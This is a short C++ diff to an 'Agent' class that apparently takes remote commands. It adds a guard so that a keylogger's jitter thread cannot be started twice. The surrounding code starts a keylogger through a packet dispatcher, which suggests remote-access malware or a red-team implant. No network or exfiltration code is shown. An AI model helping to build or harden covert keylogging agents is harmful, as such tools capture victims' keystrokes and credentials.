@@ -172,6 +172,10 @@ void Agent::handleDispatching(Packet&& packet) {
 }
 
 void Agent::handleKeylogStart() {
+    if (m_keylog_jitter_thread.joinable()) {
+        std::cerr << "[Agent] Jitter thread already running — ignoring double start.\n";
+        return;
+    }
     std::cout << "[Agent] Starting KeyLogger...\n";
     m_keylogger.start();
 
